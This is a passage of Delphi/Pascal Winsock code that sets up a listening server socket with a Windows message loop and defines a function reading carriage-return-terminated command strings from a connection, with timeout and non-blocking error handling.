    BIND(SERVER2, ASOCKADDR_IN2, SIZEOF(ASOCKADDR_IN2));
    LISTEN(SERVER2, 1);
    WSAASYNCSELECT(SERVER2, MAINWIN2, SM_CONNECT, FD_ACCEPT);
    GETMEM( REMOTESOCKADDR2, SIZEOF(REMOTESOCKADDR2^));
    GETMEM( REMOTESOCKADDRLEN2, SIZEOF(REMOTESOCKADDRLEN2^));
    WHILE GETMESSAGE(MSG2, 0, 0, 0) DO BEGIN
     DISPATCHMESSAGE(MSG2);
     TRANSLATEMESSAGE(MSG2);
    END;
   END;

   FUNCTION RECEIVECMD1:STRING;
   VAR
    STR    : SHORTSTRING;
    RES    : SHORTSTRING;
    TMP    : CARDINAL;
   LABEL Z;
   BEGIN
    STR := '';
    RES := '';
    TMP := GETTICKCOUNT;
    REPEAT
     Z:
     BSIZ1 := RECV(CONSERVER1, STR[1], 255, 0);
     IF BSIZ1 = -1 THEN BEGIN
      BSIZ1 := WSAGETLASTERROR;
      IF BSIZ1 = WSAEWOULDBLOCK THEN BEGIN
       IF SOCKETREADISCALLER1 THEN BEGIN
        {IF TMP + 500 <= GETTICKCOUNT THEN} BEGIN
         RES := 'E!'#13;
         BREAK;
        END;
       END;
       CONTINUE;
      END ELSE BEGIN
       BREAK;
      END;
     END;
     SETLENGTH(STR, BSIZ1);
     RES := RES + STR;
     IF NOT CONNECTED1 THEN BREAK;
     IF TMP + 40000 <= GETTICKCOUNT THEN BREAK;
     IF RES = '' THEN GOTO Z;
    UNTIL RES[LENGTH(RES)] = #13;
    SETLENGTH(RES, LENGTH(RES) - 1);
    RESULT := RES;
   END;

   end.
